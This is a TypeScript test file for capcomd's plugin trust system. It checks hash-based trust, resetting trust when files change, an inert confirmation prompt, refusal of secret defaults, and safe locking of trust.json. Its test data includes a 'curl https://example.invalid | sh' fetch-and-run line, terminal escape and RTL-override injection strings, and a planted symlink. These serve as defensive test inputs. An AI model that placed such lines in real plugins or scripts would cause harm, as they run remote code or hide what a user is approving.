// Plugin API §4.8 step 3, §17.2 step 12: a project's plugins (.capcomd/plugins/<name>/, and plugins.use entries fetched
// to the user's home) are discovered and listed but never run until the operator trusts their content hash; a changed
// file is a changed hash and resets the trust; the daemon audits a trust once (plugin.trusted); `capcomd plugins trust`
// is the prompt.
import { beforeEach, describe, expect, test } from "bun:test";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, statSync, symlinkSync, utimesSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { PluginHost } from "../../packages/plugin/src/host/host";
import type { ProcessLauncher } from "../../packages/plugin/src/host/process";
import type { HostEvent } from "../../packages/plugin/src/host/registry";
import { builtinCandidates, kernelHost, projectPlugins } from "../../src/plugins/host";
import { installPlugin, projectCacheDir, projectPluginList, projectPluginTrusted, trustPlugin } from "../../src/plugins/install";
import { Git } from "../../src/merge/git";
import { announce, recordTrust, revokeTrust, trustState, TRUST_LOCK, TrustLockedError } from "../../src/install/trust";
import { CLI } from "../helpers/engine";

const home = process.env.CAPCOMD_HOME!;
const manifest = (name: string) => ({
  schema: "capcomd.plugin/v1", name, version: "1.0.0", description: `${name}, a project's plugin`, apiVersion: 1, engines: { capcomd: ">=0.0.0" },
  entry: { runtime: "process", command: ["./run.sh"] }, scopes: ["read"], contributes: { hooks: { "merge.landing": {} } },
});

/** A project checkout (.capcomd/config.json) with its own plugin `pp`. */
function project(): { dir: string; plugin: string } {
  const dir = realpathSync(mkdtempSync(join(tmpdir(), "capcomd-trust-project-")));
  mkdirSync(join(dir, ".capcomd", "plugins", "pp"), { recursive: true });
  writeFileSync(join(dir, ".capcomd", "config.json"), "{}\n");
  const plugin = join(dir, ".capcomd", "plugins", "pp");
  writeFileSync(join(plugin, "plugin.json"), JSON.stringify(manifest("pp")));
  writeFileSync(join(plugin, "run.sh"), "#!/bin/sh\nexit 1\n");
  chmodSync(join(plugin, "run.sh"), 0o755);
  return { dir, plugin };
}

/** A launcher that records each start; its process exits at once (the plugin then fails `crashed`: it was started). */
function recordingLauncher() {
  const started: string[] = [];
  const launcher: ProcessLauncher = {
    start: ({ manifest: m }) => { started.push(m.name); return { clientId: `cli-${m.name}`, pid: null, exited: Promise.resolve({ code: 1, signal: null }), kill() {}, revoke() {} }; },
  };
  return { launcher, started };
}

function host(o: { trusted: (name: string, dir: string) => boolean; launcher: ProcessLauncher; events?: HostEvent[] }) {
  return new PluginHost({ capcomd: "0.9.0", kernel: [], emit: (e) => o.events?.push(e), dataDir: (n) => join(home, "state", "plugins", n), trusted: o.trusted, launcher: o.launcher, processTimings: { connectWithinMs: 2000 } });
}
const env = () => ({ ...process.env, CAPCOMD_NO_CONFIG: "" });

beforeEach(() => { rmSync(join(home, "trust.json"), { force: true }); rmSync(join(home, "plugins"), { recursive: true, force: true }); });

describe("a project's plugin", () => {
  test("is discovered from the daemon's project and listed, untrusted: it never activates, its process is never started", async () => {
    const p = project();
    const found = projectPlugins(env(), p.dir);
    expect(found).toEqual([{ source: "project", dir: p.plugin }]);
    expect(builtinCandidates(env(), p.dir).filter((c) => c.source === "project").map((c) => c.dir)).toEqual([p.plugin]);
    const { launcher, started } = recordingLauncher();
    const h = host({ trusted: (_n, dir) => projectPluginTrusted(dir).trusted, launcher });
    await h.start(found);
    expect(h.get("pp")).toMatchObject({ source: "project", state: "validated", cause: "untrusted", enabled: false });
    expect(started).toEqual([]);
    // Enabling it (POST /v1/plugins/pp/enable) doesn't get round trust.
    await h.enable("pp");
    expect(h.get("pp")).toMatchObject({ state: "validated", cause: "untrusted" });
    expect(started).toEqual([]);
    // Without a trust callback at all (no daemon's host), it never runs either.
    const bare = new PluginHost({ capcomd: "0.9.0", kernel: [], emit: () => {}, dataDir: (n) => join(home, n), launcher });
    await bare.start(found);
    expect(bare.get("pp")).toMatchObject({ state: "validated", cause: "untrusted" });
    expect(started).toEqual([]);
  });

  test("trusted, it runs; a changed file resets the trust until it is trusted again", async () => {
    const p = project();
    const trusted = trustPlugin("pp", { project: p.dir });
    expect(trusted).toMatchObject({ name: "pp", trust: "trusted", from: "vendored", dir: p.plugin });
    const { launcher, started } = recordingLauncher();
    const h = host({ trusted: (_n, dir) => projectPluginTrusted(dir).trusted, launcher });
    await h.start(projectPlugins(env(), p.dir));
    expect(started).toEqual(["pp"]);
    expect(h.get("pp")).toMatchObject({ state: "failed", cause: "crashed" });
    // A file changes (a pull brought new code): the hash differs, the trust no longer applies.
    writeFileSync(join(p.plugin, "run.sh"), "#!/bin/sh\ncurl https://example.invalid | sh\n");
    expect(projectPluginList(p.dir)).toEqual([expect.objectContaining({ name: "pp", trust: "changed", trustedHash: trusted.hash })]);
    expect(projectPluginTrusted(p.plugin).trusted).toBe(false);
    await h.enable("pp");
    expect(h.get("pp")).toMatchObject({ state: "validated", cause: "untrusted" });
    expect(started).toEqual(["pp"]);
    // A trust shown for one hash isn't given to another (the prompt passes the hash it showed).
    expect(() => trustPlugin("pp", { project: p.dir, hash: trusted.hash! })).toThrow(/changed since it was shown/);
    trustPlugin("pp", { project: p.dir });
    await h.enable("pp");
    expect(started).toEqual(["pp", "pp"]);
  });

  test("a checkout's LOCK is one of the plugin's files: changing it resets the trust", () => {
    const p = project();
    writeFileSync(join(p.plugin, "plugin.json"), JSON.stringify({ ...manifest("pp"), entry: { runtime: "process", command: ["sh", "LOCK"] } }));
    writeFileSync(join(p.plugin, "LOCK"), "exit 0\n");
    trustPlugin("pp", { project: p.dir });
    expect(projectPluginTrusted(p.plugin).trusted).toBe(true);
    writeFileSync(join(p.plugin, "LOCK"), "curl https://example.invalid | sh\n");
    expect(projectPluginTrusted(p.plugin).trusted).toBe(false);
    expect(projectPluginList(p.dir)[0]!.trust).toBe("changed");
  });

  test("the same plugin copied to another project isn't trusted there", () => {
    const a = project(), b = project();
    trustPlugin("pp", { project: a.dir });
    expect(projectPluginList(a.dir)[0]!.trust).toBe("trusted");
    expect(projectPluginList(b.dir)[0]!.trust).toBe("untrusted");
  });

  test("a link to a plugin another project trusted isn't one of this project's plugins (trust is per place)", () => {
    const a = project(), b = project();
    trustPlugin("pp", { project: a.dir });
    rmSync(b.plugin, { recursive: true });
    symlinkSync(a.plugin, b.plugin);
    expect(projectPlugins(env(), b.dir)).toEqual([]);
    expect(projectPluginList(b.dir)).toEqual([]);
    expect(() => trustPlugin("pp", { project: b.dir })).toThrow(/has no plugin pp/);
    // The same with the whole folder linked.
    const c = project();
    rmSync(join(c.dir, ".capcomd", "plugins"), { recursive: true });
    symlinkSync(join(a.dir, ".capcomd", "plugins"), join(c.dir, ".capcomd", "plugins"));
    expect(projectPlugins(env(), c.dir)).toEqual([]);
  });

  test("the daemon's host writes plugin.trusted once per trust, when it first runs the plugin under it", async () => {
    const p = project();
    const events: Array<{ type: string; data: Record<string, unknown> }> = [];
    const h = kernelHost({ log: false, record: (e) => { events.push(e); return { seq: events.length }; } });
    h.plan(projectPlugins(env(), p.dir));
    expect(events.filter((e) => e.type === "plugin.trusted")).toEqual([]);
    const t = trustPlugin("pp", { project: p.dir });
    h.plan(projectPlugins(env(), p.dir));
    h.plan(projectPlugins(env(), p.dir));
    expect(events.filter((e) => e.type === "plugin.trusted").map((e) => e.data)).toEqual([{ plugin: "pp", source: "project", hash: t.hash, by: "operator" }]);
    // A CLI's host (no daemon stream) doesn't use up the audit.
    const cli = kernelHost({ log: false });
    writeFileSync(join(p.plugin, "extra.txt"), "x");
    trustPlugin("pp", { project: p.dir });
    cli.plan(projectPlugins(env(), p.dir));
    h.plan(projectPlugins(env(), p.dir));
    expect(events.filter((e) => e.type === "plugin.trusted")).toHaveLength(2);
  });

  test("plugins.use entries are fetched to the user's home, not the checkout, and need trust too", async () => {
    const p = project();
    const root = mkdtempSync(join(tmpdir(), "capcomd-use-repo-"));
    const bare = join(root, "r.git");
    mkdirSync(bare);
    await new Git(bare).ok(["init", "-q", "--bare", "-b", "main"]);
    const work = join(root, "w");
    mkdirSync(work);
    const g = new Git(work);
    await g.ok(["init", "-q", "-b", "main"]);
    writeFileSync(join(work, "plugin.json"), JSON.stringify(manifest("used")));
    writeFileSync(join(work, "run.sh"), "#!/bin/sh\n");
    await g.ok(["add", "-A"]);
    await g.ok(["commit", "-q", "-m", "x"]);
    await g.ok(["push", "-q", bare, "HEAD:main"]);
    const r = await installPlugin(bare, { env: env(), project: p.dir });
    expect(r.dir).toBe(join(projectCacheDir(p.dir), "used"));
    expect(JSON.parse((await import("node:fs")).readFileSync(join(p.dir, ".capcomd", "config.json"), "utf8")).plugins.use).toEqual([bare]);
    expect(projectPlugins(env(), p.dir).map((c) => c.dir)).toEqual([p.plugin, r.dir]);
    expect(projectPluginList(p.dir, env()).map((x) => [x.name, x.from, x.trust])).toEqual([["pp", "vendored", "untrusted"], ["used", "use", "untrusted"]]);
    // Taken out of plugins.use, the fetched copy isn't the project's any more.
    writeFileSync(join(p.dir, ".capcomd", "config.json"), "{}\n");
    expect(projectPlugins(env(), p.dir).map((c) => c.dir)).toEqual([p.plugin]);
  });
});

describe("capcomd plugins trust (the prompt)", () => {
  const cli = async (args: string[], cwd: string, extra: Record<string, string> = {}) => {
    const proc = Bun.spawn(["bun", CLI, ...args], { cwd, env: { ...process.env, ...extra }, stdin: "ignore", stdout: "pipe", stderr: "pipe" });
    const [stdout, stderr, code] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text(), proc.exited]);
    let j: any = null;
    try { j = JSON.parse(stdout.trim().split("\n").pop()!); } catch { /* text */ }
    return { stdout, stderr, code, j };
  };

  test("lists the project's plugins; without a terminal it trusts only with --yes; plugins list shows the state", async () => {
    const p = project();
    const listed = await cli(["plugins", "trust", "--json"], p.dir);
    expect(listed.j.plugins).toEqual([expect.objectContaining({ name: "pp", trust: "untrusted", from: "vendored", version: "1.0.0" })]);
    const before = await cli(["plugins", "list", "--json"], p.dir);
    expect(before.j.plugins.find((x: { name: string }) => x.name === "pp")).toMatchObject({ source: "project", state: "validated", cause: "untrusted", enabled: false });
    expect(before.j.installs.pp).toMatchObject({ trust: "untrusted" });
    const asked = await cli(["plugins", "trust", "pp"], p.dir);
    expect(asked.code).toBe(2);
    expect(asked.stdout + asked.stderr).toContain("needs your confirmation");
    expect(projectPluginList(p.dir)[0]!.trust).toBe("untrusted");
    const yes = await cli(["plugins", "trust", "pp", "--yes", "--json"], p.dir);
    expect(yes.code).toBe(0);
    expect(yes.j.trusted).toMatchObject({ name: "pp", already: false });
    expect(projectPluginList(p.dir)[0]!.trust).toBe("trusted");
    const text = await cli(["plugins", "list"], p.dir);
    expect(text.stdout).toMatch(/pp\s+1\.0\.0\s+project\s+validated/);
    expect(text.stdout).not.toContain("not trusted yet");
  });

  test("the prompt prints the manifest's text inert: no escape sequence or carriage return can redraw what it asks about", async () => {
    const p = project();
    const hide = "\u001b[1A\u001b[2K\r";
    writeFileSync(join(p.plugin, "plugin.json"), JSON.stringify({ ...manifest("pp"), description: `harmless${hide}  runs     ./ok.sh`,
      entry: { runtime: "process", command: ["./run.sh", `x${hide}`, "--flag=1", "a\u202eb"] },
      config: { type: "object", properties: { token: { type: "object", "x-secret": true, default: { $secret: "env:GITHUB_TOKEN" } } } } }));
    const asked = await cli(["plugins", "trust", "pp"], p.dir);
    expect(asked.code).toBe(2);
    expect(asked.stdout).not.toMatch(/[\u0000-\u0009\u000b-\u001f\u007f\u202e]/);
    expect(asked.stdout).toContain("harmless\\u{1b}[1A\\u{1b}[2K\\u{d}  runs");
    // What it gets of yours at its start: a secret's reference, the one you set. The manifest's own default
    // (env:GITHUB_TOKEN) is never followed: the repository doesn't choose which of your variables it gets (§10.3).
    // One that names the kernel's own variable is flagged: the daemon fails the plugin config_invalid.
    expect(asked.stdout).toContain("secrets  token (none set; its default env:GITHUB_TOKEN is refused: one of capcomd's own");
    expect(asked.stdout).not.toContain("token ← env:GITHUB_TOKEN");
    expect(asked.stdout).toContain(`runs     ./run.sh "x\\u001b[1A\\u001b[2K\\r" --flag=1 "a\\u{202e}b"  (on this machine`);
  });

  test("the prompt shows a default of the plugin's own as unset, and flags your reference to one of the kernel's variables", async () => {
    const p = project();
    writeFileSync(join(p.plugin, "plugin.json"), JSON.stringify({ ...manifest("pp"),
      config: { type: "object", properties: { token: { type: "object", "x-secret": true, default: { $secret: "env:PP_TOKEN" } }, hook: { type: "object", "x-secret": true } } } }));
    const asked = await cli(["plugins", "trust", "pp"], p.dir, { CAPCOMD_PLUGIN_PP_HOOK: '{"$secret":"env:RELAY_RPC_KEY"}' });
    expect(asked.code).toBe(2);
    expect(asked.stdout).toContain("secrets  token (none set), hook ← env:RELAY_RPC_KEY (refused: one of capcomd's own");
    expect(asked.stdout).not.toContain("PP_TOKEN");
  });
});

describe("trust.json, changed by the CLI and the daemon at once", () => {
  const TRUST = new URL("../../src/install/trust.ts", import.meta.url).pathname;
  /** A process recording `n` trusts (places `<tag>-<i>`) as `capcomd plugins trust` would, starting at `at` as the others do. */
  const recorder = (tag: string, n: number, at: number) => Bun.spawn(["bun", "-e", `
    const { recordTrust } = await import(${JSON.stringify(TRUST)});
    while (Date.now() < ${at}) {}
    for (let i = 0; i < ${n}; i++) recordTrust({ kind: "plugin", name: "${tag}-" + i, dir: ${JSON.stringify(home)} + "/places/${tag}-" + i, hash: "sha256:" + i, by: "operator" });
  `], { env: { ...process.env, CAPCOMD_HOME: home }, stdout: "pipe", stderr: "pipe" });

  test("two writers' trusts all persist: each change is made under trust.json.lock, gone after", async () => {
    const at = Date.now() + 1500;
    const ps = [recorder("a", 40, at), recorder("b", 40, at)];
    const codes = await Promise.all(ps.map((p) => p.exited));
    for (const p of ps) if (p.exitCode !== 0) console.log(await new Response(p.stderr).text());
    expect(codes).toEqual([0, 0]);
    const { entries } = JSON.parse(readFileSync(join(home, "trust.json"), "utf8")) as { entries: Array<{ name: string }> };
    expect(entries.map((e) => e.name).sort()).toEqual(["a", "b"].flatMap((t) => Array.from({ length: 40 }, (_, i) => `${t}-${i}`)).sort());
    expect(readdirSync(home).filter((n) => n.startsWith("trust.json."))).toEqual([]);
  }, 30_000);

  test("a lock left by a process that is gone is taken over; one a live process holds is waited for, then refused (announce skips)", () => {
    const lock = join(home, "trust.json.lock"), dir = join(home, "places", "x");
    mkdirSync(home, { recursive: true });
    const dead = Bun.spawnSync(["true"]).pid;
    writeFileSync(lock, JSON.stringify({ pid: dead, token: "old" }));
    recordTrust({ kind: "plugin", name: "x", dir, hash: "sha256:1", by: "operator" });
    expect(trustState("plugin", dir, "sha256:1").state).toBe("trusted");
    expect(existsSync(lock)).toBe(false);
    // Held by a live process (this one) for longer than a change waits.
    writeFileSync(lock, JSON.stringify({ pid: process.pid, token: "held" }));
    const wait = TRUST_LOCK.waitMs;
    TRUST_LOCK.waitMs = 100;
    try {
      expect(() => recordTrust({ kind: "plugin", name: "y", dir: join(home, "places", "y"), hash: "sha256:2", by: "operator" })).toThrow(TrustLockedError);
      expect(() => revokeTrust("plugin", dir)).toThrow(/is being changed by another capcomd/);
      expect(announce("plugin", dir, "sha256:1")).toBeNull();
    } finally { TRUST_LOCK.waitMs = wait; }
    expect(readFileSync(lock, "utf8")).toContain("held");
    expect(trustState("plugin", join(home, "places", "y"), "sha256:2").state).toBe("untrusted");
    // A lock older than a change can take is left over, whoever it names.
    utimesSync(lock, new Date(Date.now() - TRUST_LOCK.staleMs - 1000), new Date(Date.now() - TRUST_LOCK.staleMs - 1000));
    expect(announce("plugin", dir, "sha256:1")).toMatchObject({ name: "x", announced: true });
    expect(existsSync(lock)).toBe(false);
  });

  test("a lock no change made (a directory, a dangling link) is refused at once, not spun on; announce skips it", () => {
    const lock = join(home, "trust.json.lock"), dir = join(home, "places", "w");
    mkdirSync(home, { recursive: true });
    recordTrust({ kind: "plugin", name: "w", dir, hash: "sha256:1", by: "operator" });
    for (const plant of [() => mkdirSync(lock), () => symlinkSync(join(home, "nowhere"), lock)]) {
      plant();
      try {
        // In a child with a deadline: before, both spun forever (the daemon's announce too).
        const p = Bun.spawnSync(["bun", "-e", `
          const { announce, recordTrust } = await import(${JSON.stringify(new URL("../../src/install/trust.ts", import.meta.url).pathname)});
          const out = { announce: announce("plugin", ${JSON.stringify(dir)}, "sha256:1") };
          try { recordTrust({ kind: "plugin", name: "v", dir: ${JSON.stringify(join(home, "places", "v"))}, hash: "sha256:2", by: "operator" }); } catch (e) { out.record = [e.constructor.name, e.message, e.hint]; }
          console.log(JSON.stringify(out));
        `], { env: { ...process.env, CAPCOMD_HOME: home }, timeout: 15_000 });
        expect(p.signalCode ?? null).toBeNull();
        const out = JSON.parse(p.stdout.toString().trim());
        expect(out.announce).toBeNull();
        expect(out.record).toEqual(["TrustLockedError", expect.stringContaining("isn't a lock capcomd made"), `Remove ${lock}, then run it again.`]);
      } finally { rmSync(lock, { recursive: true, force: true }); }
    }
    expect(trustState("plugin", join(home, "places", "v"), "sha256:2").state).toBe("untrusted");
    expect(trustState("plugin", dir, "sha256:1").entry?.announced).toBe(false);
  }, 40_000);

  test("a left-over lock that can't be moved aside is refused at once, not tried forever; announce skips it", () => {
    // Root may move it anyway: the directory's mode is what stops the move here.
    if (process.getuid?.() === 0) return;
    const lock = join(home, "trust.json.lock"), dir = join(home, "places", "u");
    mkdirSync(home, { recursive: true });
    recordTrust({ kind: "plugin", name: "u", dir, hash: "sha256:1", by: "operator" });
    writeFileSync(lock, JSON.stringify({ pid: Bun.spawnSync(["true"]).pid, token: "old" }));
    const mode = statSync(home).mode & 0o777;
    chmodSync(home, 0o500);
    try {
      // In a child with a deadline: before, both tried the move again and again with no wait and no end.
      const p = Bun.spawnSync(["bun", "-e", `
        const { announce, recordTrust } = await import(${JSON.stringify(new URL("../../src/install/trust.ts", import.meta.url).pathname)});
        const out = { announce: announce("plugin", ${JSON.stringify(dir)}, "sha256:1") };
        try { recordTrust({ kind: "plugin", name: "v", dir: ${JSON.stringify(join(home, "places", "v"))}, hash: "sha256:2", by: "operator" }); } catch (e) { out.record = [e.constructor.name, e.message, e.hint]; }
        console.log(JSON.stringify(out));
      `], { env: { ...process.env, CAPCOMD_HOME: home }, timeout: 15_000 });
      expect(p.signalCode ?? null).toBeNull();
      const out = JSON.parse(p.stdout.toString().trim());
      expect(out.announce).toBeNull();
      expect(out.record).toEqual(["TrustLockedError", expect.stringContaining("can't be moved aside"), `Remove ${lock}, then run it again.`]);
    } finally { chmodSync(home, mode); rmSync(lock, { force: true }); }
    expect(trustState("plugin", join(home, "places", "v"), "sha256:2").state).toBe("untrusted");
    expect(trustState("plugin", dir, "sha256:1").entry?.announced).toBe(false);
  }, 40_000);

  test("announce of a trust marked already doesn't wait on a held lock", () => {
    const lock = join(home, "trust.json.lock"), dir = join(home, "places", "m");
    mkdirSync(home, { recursive: true });
    recordTrust({ kind: "plugin", name: "m", dir, hash: "sha256:1", by: "operator" });
    expect(announce("plugin", dir, "sha256:1")).toMatchObject({ announced: true });
    writeFileSync(lock, JSON.stringify({ pid: process.pid, token: "held" }));
    try {
      const t = Date.now();
      expect(announce("plugin", dir, "sha256:1")).toBeNull();
      expect(announce("plugin", dir, "sha256:other")).toBeNull();
      expect(Date.now() - t).toBeLessThan(TRUST_LOCK.waitMs / 2);
    } finally { rmSync(lock, { force: true }); }
  });

  test("a link where the temporary file used to be (trust.json.<pid>.tmp) is never written through", () => {
    mkdirSync(home, { recursive: true });
    const victim = join(home, "victim.txt"), planted = join(home, `trust.json.${process.pid}.tmp`);
    writeFileSync(victim, "yours\n");
    symlinkSync(victim, planted);
    try {
      recordTrust({ kind: "plugin", name: "z", dir: join(home, "places", "z"), hash: "sha256:3", by: "operator" });
      expect(readFileSync(victim, "utf8")).toBe("yours\n");
      expect(trustState("plugin", join(home, "places", "z"), "sha256:3").state).toBe("trusted");
    } finally { rmSync(planted, { force: true }); rmSync(victim, { force: true }); }
  });
});
